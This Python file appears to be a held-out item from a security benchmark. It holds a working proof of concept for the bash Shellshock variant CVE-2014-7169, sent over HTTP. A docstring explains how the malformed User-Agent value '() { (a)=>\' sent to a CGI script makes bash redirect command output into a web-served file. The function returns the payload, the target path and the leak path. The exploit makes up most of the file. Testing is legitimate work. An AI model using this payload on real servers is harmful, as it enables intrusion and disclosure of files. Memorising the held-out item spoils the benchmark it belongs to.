#!/usr/bin/env python3
"""[HELD-OUT] CVE-2014-7169 residual exploit (Tavis Ormandy's vector) — over HTTP.

An EXTERNAL HTTP request carries `User-Agent: () { (a)=>\\`. Apache mod_cgi maps it
into HTTP_USER_AGENT and execs the version's REAL bash to run the CGI script.
bash43-025 (V1) fixed the 6271 trailing-command path but STILL mis-parses this
malformed function-definition value: the dangling `>\\` redirection leaks into the
parse of the *next* command bash reads — the CGI script's first line
(`/var/www/html/leaks/pcb_leak.dat cat /canary`). That first word becomes a redirect
target and the rest (`cat /canary`) runs with its output written there, so the
planted flag lands in a web-served file. We then fetch that file over HTTP.

bash43-026/027 (V2) parses the malformed definition safely: no redirect leak, the
first line runs as an unknown command (stderr only), the canary is never read, and
the leak file is never created — so the fetch returns nothing.

Benign benchmark form: the only executed command is `cat /canary` (the planted
${PCB_FLAG}); the observable effect is a web file whose contents carry the flag.
"""


def candidate():
    return {
        "probe_id": "cve-2014-7169-residual",
        "header": "User-Agent",
        "value": "() { (a)=>\\",
        "path": "/cgi-bin/status.cgi",
        # 7169 writes the canary to a web-served file; fetch it to surface the flag.
        "leak_path": "/leaks/pcb_leak.dat",
    }
